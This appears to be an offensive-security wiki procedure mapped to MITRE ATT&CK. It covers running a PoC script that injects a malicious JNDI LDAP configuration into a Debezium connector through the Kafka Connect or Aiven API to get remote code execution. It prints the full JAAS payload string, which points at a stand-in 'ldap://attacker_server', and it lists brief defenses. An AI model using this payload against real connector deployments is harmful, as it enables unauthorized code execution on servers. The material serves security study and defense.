---
id: proc-execute-poc-script
tags:
  - poc
  - api-injection
  - debezium
type: procedure
tools:
  - '[[tools/Python3]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/python3-poc-execution]]'
verified: false
platforms:
  - Linux
  - Cloud
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:23:49.627Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Execute-Debezium-Connector-PoC-Script

## Summary

This procedure runs a Python script to inject a malicious JNDI LDAP URL into the Debezium MySQL connector's JAAS configuration via Aiven or Kafka Connect API, triggering the deserialization exploit.

## Description

The PoC script authenticates to the API and updates the `database.history.producer.sasl.jaas.config` property with a JndiLoginModule configuration pointing to the attacker's LDAP server. This causes the Kafka Connect server to perform an LDAP lookup, deserialize the response, and execute the RCE payload. Requires API access and Python with requests library.

## Requirements

1. Python 3 with requests library
2. Aiven API token or Kafka Connect credentials
3. PoC script (poc.py) prepared with target details
4. Rogue LDAP server already running

## Defense

Defensive measures and detection strategies:

- Sanitize and validate all connector config inputs for JNDI URLs
- Enable API logging and audit config changes
- Restrict JAAS providers to internal only
- Use WAF or API gateway to block suspicious updates

## Objectives

1. Update connector config with malicious JNDI
2. Initiate LDAP connection from target
3. Trigger deserialization and RCE

## Instructions

### Step 1: Run PoC Script

**Context**: Execute the script to apply the vulnerable configuration.

**Command** ([[commands/python3-poc-execution]]):
```bash
python3 poc.py
```

> The script handles API calls to set the JAAS config to `com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://attacker_server" useFirstPass="true" serviceName="x" debug="true" group.provider.url="xxx";`. Expected output: HTTP 200/201 response confirming update, followed by LDAP traffic.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques


## Commands Used

- [[commands/python3-poc-execution]]

## Tools Used

- [[tools/Python3]]

## Tags

- poc
- api-injection
- debezium
